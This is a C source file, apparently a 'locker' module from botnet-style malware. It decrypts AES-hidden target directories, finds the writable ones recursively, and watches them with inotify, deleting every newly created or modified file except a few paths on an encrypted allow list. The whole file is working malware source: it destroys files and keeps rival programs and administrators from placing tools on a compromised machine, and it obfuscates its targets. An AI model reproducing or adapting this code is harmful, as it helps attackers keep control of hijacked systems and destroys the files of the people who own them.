#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <pthread.h>
#include <stddef.h>

#include "headers/locker.h"
#include "headers/aes.h"
#include "headers/config.h"

#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))

char *initial_paths[] = {
    "ae38f011bfc0fce83fb2aba279034a1ee9a3f0c7cc851fb26e9907478e8aeb41",
    "f196f8635ca1894c45e1421df77a4ae55c05b3c92226573136a9e1c9673bf4e9",
    "b58e1bd69a3f142421707d83ab5ee445f250adfbcf54f552e25409fc36ba1315",
    "6608175db5b7f2c984136c49ef553612c45b7805ad87dca7ac57e87db520ae42",
    "39470bce61cad7596286c52d37c1f0f1980c24ebcdaf6fad5edc60c524053404",
    "20c3fadda508b38e9760fb0721226160e50559ca8f887f04243b94f7f0652002",
    "3150ee81164bf0bd81f9dd57839b9710a052f77e888ec4e4e2475b41be41913f",
    "e95d68748b95258a9472afab7b90fc15967b9d00eaa8e5464c8ca7d10ba7a9d3",
    "18523939ffef148e61362f3534e381283f7bb9026a8e7cd17f9acbc2ea133fb8",
    "5754e69b3c51098b5c920d24e314ef2abda81510b359e0f788937455aaa7de54"
};

char *blacklisted[] = {
    "883736a19a505b93a1ecad5e1d7f2ea53580c33b56915f13426b186e16806670",
    "f5cae8edf85cf396c7a0cdba057619b64e6e01a564af14530bbfbe0669ce61e7",
    "820b4350a45ba2d5de53fb492c21f56e4dbef2770c72007cc749a4fe2876731d"
};

struct watcher {
    char *path;
    int wd;
};

static pthread_t watcher_thread;
static volatile int watcher_running = 0;

char **paths = NULL;
int num_paths = 0;

struct watcher **watchers = NULL;
int num_watchers = 0;

int watcher_len;
int fd;
int watcher_pid = 0;

char buffer[EVENT_BUF_LEN];

char *my_strdup(const char *src) {
    size_t len = strlen(src) + 1;
    char *dup = malloc(len);
    if (dup != NULL) {
        memcpy(dup, src, len);
    }
    return dup;
}

void free_paths() {
    for (int i = 0; i < num_paths; ++i)
        free(paths[i]);

    free(paths);
    paths = NULL;
}

void free_watchers() {
    for (int i = 0; i < num_watchers; i++) {
        inotify_rm_watch(fd, watchers[i]->wd);
        free(watchers[i]->path);
    }

    free(watchers);
}

void find_writable_dirs_recursive(const char *dir) {
    DIR *dp = opendir(dir);
    if (!dp) return;

    if (access(dir, W_OK) == 0) {
        char **temp = realloc(paths, (num_paths + 1) * sizeof(char *));
        if (temp != NULL) {
            paths = temp;
            paths[num_paths] = my_strdup(dir);
            if (paths[num_paths] == NULL) {
                free_paths();
                return;
            } else {
                num_paths++;
            }
        } else {
            free_paths();
            return;
        }
    }

    struct dirent *entry;
    while ((entry = readdir(dp))) {
        if (entry->d_name[0] != '.' && entry->d_type == 4) {
            char p[1024];
            snprintf(p, sizeof(p), "%s/%s", dir, entry->d_name);
            find_writable_dirs_recursive(p);
        }
    }

    closedir(dp);
}

void find_writable_dirs_initial() {
    for (int i = 0; i < (int)(sizeof(initial_paths) / sizeof(initial_paths[0])); i++) {
        char *decrypted = aes_decrypt_hex_string(AES_KEY, initial_paths[i]);
        if (decrypted) {
            find_writable_dirs_recursive(decrypted);
            free(decrypted);
        }
    }
}

void initialize_inotify() {
    fd = inotify_init();
    if (fd < 0)
        return;
}

void add_watcher(const char *path) {
    struct watcher *watch = malloc(sizeof(struct watcher));
    if (!watch) return;

    watch->path = my_strdup(path);
    if (watch->path == NULL) {
        free(watch);
        return;
    }

    watch->wd = inotify_add_watch(fd, watch->path, IN_CREATE | IN_MODIFY);
    if (watch->wd == -1) {
        free(watch->path);
        free(watch);
        return;
    }

    watchers = realloc(watchers, (num_watchers + 1) * sizeof(struct watcher *));
    if (watchers == NULL) {
        inotify_rm_watch(fd, watch->wd);
        free(watch->path);
        free(watch);
        return;
    }

    watchers[num_watchers] = watch;
    num_watchers++;
}

void handle_inotify_event(struct inotify_event *event) {
    for (int j = 0; j < num_watchers; j++) {
        if (event->wd != watchers[j]->wd) continue;
        if (event->mask & IN_ISDIR) continue;

        char name[FILENAME_MAX] = "";
        snprintf(name, sizeof(name), "%s/%s", watchers[j]->path, event->name);

        int is_safe = 0;
        for (int h = 0; h < (int)(sizeof(blacklisted) / sizeof(blacklisted[0])); ++h) {
            char *decrypted = aes_decrypt_hex_string(AES_KEY, blacklisted[h]);
            if (decrypted && strcmp(name, decrypted) == 0) {
                is_safe = 1;
                free(decrypted);
                break;
            }
            free(decrypted);
        }

        if (!is_safe) {
            remove(name);
        }
        break;
    }
}

int watcher_destroy() {
    free_watchers();
    close(fd);
    return 0;
}

void *watcher_loop(void *arg) {
    find_writable_dirs_initial();
    initialize_inotify();

    for (int i = 0; i < num_paths; ++i) {
        add_watcher(paths[i]);
    }

    while (watcher_running) {
        watcher_len = read(fd, buffer, EVENT_BUF_LEN);
        if (watcher_len <= 0) break;

        int i = 0;
        while (i < watcher_len) {
            struct inotify_event *event = (struct inotify_event *) &buffer[i];
            handle_inotify_event(event);
            i += EVENT_SIZE + event->len;
        }
    }

    watcher_destroy();
    return NULL;
}

void start_locker() {
    if (watcher_running) return;
    watcher_running = 1;
    watcher_pid = getpid();
    if (pthread_create(&watcher_thread, NULL, watcher_loop, NULL) != 0) {
        watcher_running = 0;
    }
}
